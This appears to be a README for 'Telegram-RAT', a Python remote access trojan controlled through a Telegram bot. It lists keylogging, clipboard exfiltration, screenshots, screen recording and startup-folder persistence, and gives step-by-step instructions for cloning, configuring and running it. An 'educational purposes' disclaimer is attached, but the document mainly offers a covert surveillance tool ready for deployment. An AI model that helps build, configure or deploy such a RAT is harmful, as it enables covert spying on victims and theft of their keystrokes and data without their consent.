# 🐀 Telegram RAT

> **DISCLAIMER**: This project is created for **educational and authorized testing purposes only**.  
> Unauthorized use of this software to access or control devices without explicit permission is **illegal and unethical**.  
> The developer is not responsible for any misuse.

---

## 📖 About

Telegram-RAT is a simple Remote Access Tool (RAT) built in Python that uses the **Telegram Bot API** as its command-and-control (C2) channel. It allows a user to remotely interact with a target machine using Telegram commands.

This tool is intended for **educational use** to demonstrate how remote access and bot-based communication work.

---

## ⚙️ Features

- 🖱️ Keylogger (saves keystrokes to file)
- 📋 Clipboard data exfiltration
- 🖥️ Screenshot capture
- 🔈 Text-to-speech execution
- 🧠 System information retrieval
- 🎥 Screen recording
- 📂 Persistence via startup folder
- 🧪 Basic command & control via Telegram bot

---

## 🚀 Setup Instructions

```bash
# 1. Clone the Repository
git clone https://github.com/script-kiddie-kali/Telegram-Rat.git
cd Telegram-Rat

# 2. Install Required Python Libraries
pip install -r requirements.txt

# (Optional) If requirements.txt doesn't exist, generate it:
# pip freeze > requirements.txt

# 3. Create a Telegram Bot
# - Open Telegram and search for @BotFather
# - Use the command /newbot and follow instructions
# - Save the API token provided by BotFather

# 4. Configure the Script
# - Open Main_Rat_Script.py
# - Replace the placeholder token with your Telegram bot token, e.g.:
# bot_token = "YOUR_TELEGRAM_BOT_TOKEN_HERE"

# 5. Run the RAT
python Main_Rat_Script.py

# Further Instructions:
# Once running, you can send commands directly through the Telegram bot chat
# in the Telegram app itself to control the RAT remotely.
# Use commands like /start, /help, /screenshot, etc.

